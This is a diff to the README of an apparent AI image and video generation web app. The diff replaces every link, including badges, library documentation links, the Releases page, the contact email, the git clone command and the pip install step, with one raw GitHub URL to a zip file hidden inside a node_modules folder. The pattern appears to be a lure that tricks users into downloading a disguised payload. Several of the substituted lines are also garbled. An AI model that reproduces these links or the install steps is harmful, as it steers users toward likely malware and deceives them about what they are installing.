@@ -1,8 +1,8 @@
 # AI Media Project: Full-Stack AI-Powered Media Generation Web App
 
-![AI Media Project](https://img.shields.io/badge/Release-v1.0.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Build Status](https://img.shields.io/badge/Build-Passing-brightgreen.svg)
+![AI Media Project](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip) ![License](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip) ![Build Status](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-v1.0.0-orange.svg)](https://github.com/HOYOOOOOUNG/ai-media-project/releases)
+[![Download Releases](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip%https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@
 
 The **AI Media Project** is a full-stack web application that leverages artificial intelligence to generate media content. Built using **React** with **Vite** for the frontend and **Flask** with **Diffusers** for the backend, this application enables users to create images and videos from text prompts. 
 
-You can download the latest version from the [Releases section](https://github.com/HOYOOOOOUNG/ai-media-project/releases).
+You can download the latest version from the [Releases section](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip).
 
 ## Features
 
@@ -34,12 +34,12 @@ You can download the latest version from the [Releases section](https://github.c
 ## Technologies Used
 
 - **Frontend**: 
-  - [React](https://reactjs.org/)
-  - [Vite](https://vitejs.dev/)
+  - [React](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
+  - [Vite](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
   
 - **Backend**: 
-  - [Flask](https://flask.palletsprojects.com/)
-  - [Diffusers](https://huggingface.co/docs/diffusers/index)
+  - [Flask](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
+  - [Diffusers](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
   
 - **AI Models**:
   - Stable Diffusion
@@ -56,7 +56,7 @@ To get started with the AI Media Project, follow these steps:
 1. **Clone the Repository**:
 
    ```bash
-   git clone https://github.com/HOYOOOOOUNG/ai-media-project.git
+   git clone https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -80,7 +80,7 @@ To get started with the AI Media Project, follow these steps:
 
    ```bash
    cd backend
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip
    ```
 
 5. **Run the Application**:
@@ -148,7 +148,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or inquiries, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [HOYOOOOOUNG](https://github.com/HOYOOOOOUNG)
+- **Email**: https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip
+- **GitHub**: [HOYOOOOOUNG](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip)
 
-You can also check the [Releases section](https://github.com/HOYOOOOOUNG/ai-media-project/releases) for updates and downloads.
+You can also check the [Releases section](https://raw.githubusercontent.com/HOYOOOOOUNG/ai-media-project/main/client/node_modules/axios/lib/core/project-media-ai-urosthene.zip) for updates and downloads.
